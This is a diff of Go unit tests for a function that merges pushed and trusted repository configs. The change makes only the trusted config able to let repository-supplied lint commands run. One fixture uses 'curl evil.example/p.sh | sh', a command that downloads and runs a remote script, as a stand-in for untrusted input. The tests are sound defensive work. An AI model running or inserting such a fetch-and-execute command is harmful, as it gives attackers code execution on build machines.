@@ -41,7 +41,7 @@ func TestEffectiveRepoConfig_TrustedOverridesPushedCommands(t *testing.T) {
 		},
 	}
 
-	got := EffectiveRepoConfig(pushed, trusted, false)
+	got := EffectiveRepoConfig(pushed, trusted)
 
 	if got.Commands.Lint != "golangci-lint run" {
 		t.Errorf("lint = %q, want trusted value", got.Commands.Lint)
@@ -67,10 +67,11 @@ func TestEffectiveRepoConfig_OptInHonorsPushedCommands(t *testing.T) {
 		Commands: Commands{Lint: "curl evil.example/p.sh | sh"},
 	}
 	trusted := &RepoConfig{
-		Commands: Commands{Lint: "golangci-lint run"},
+		Commands:          Commands{Lint: "golangci-lint run"},
+		AllowRepoCommands: true,
 	}
 
-	got := EffectiveRepoConfig(pushed, trusted, true)
+	got := EffectiveRepoConfig(pushed, trusted)
 
 	if got.Commands.Lint != "curl evil.example/p.sh | sh" {
 		t.Errorf("lint = %q, want pushed value under opt-in", got.Commands.Lint)
@@ -85,7 +86,7 @@ func TestEffectiveRepoConfig_NoTrustedDisablesCommands(t *testing.T) {
 		},
 	}
 
-	got := EffectiveRepoConfig(pushed, nil, false)
+	got := EffectiveRepoConfig(pushed, nil)
 
 	if got.Commands.Lint != "" {
 		t.Errorf("lint = %q, want empty (no trusted config)", got.Commands.Lint)
@@ -95,13 +96,16 @@ func TestEffectiveRepoConfig_NoTrustedDisablesCommands(t *testing.T) {
 	}
 }
 
-func TestEffectiveRepoConfig_NoTrustedOptInStillHonorsPushed(t *testing.T) {
-	pushed := &RepoConfig{Commands: Commands{Lint: "make lint"}}
+func TestEffectiveRepoConfig_NoTrustedCannotOptInPushedCommands(t *testing.T) {
+	pushed := &RepoConfig{
+		AllowRepoCommands: true,
+		Commands:          Commands{Lint: "make lint"},
+	}
 
-	got := EffectiveRepoConfig(pushed, nil, true)
+	got := EffectiveRepoConfig(pushed, nil)
 
-	if got.Commands.Lint != "make lint" {
-		t.Errorf("lint = %q, want pushed value under opt-in", got.Commands.Lint)
+	if got.Commands.Lint != "" {
+		t.Errorf("lint = %q, want empty without a trusted opt-in", got.Commands.Lint)
 	}
 }
 
@@ -110,7 +114,7 @@ func TestEffectiveRepoConfig_NilPushedSafeDefaults(t *testing.T) {
 		Commands: Commands{Lint: "golangci-lint run"},
 	}
 
-	got := EffectiveRepoConfig(nil, trusted, false)
+	got := EffectiveRepoConfig(nil, trusted)
 
 	if got.Commands.Lint != "golangci-lint run" {
 		t.Errorf("lint = %q, want trusted value", got.Commands.Lint)
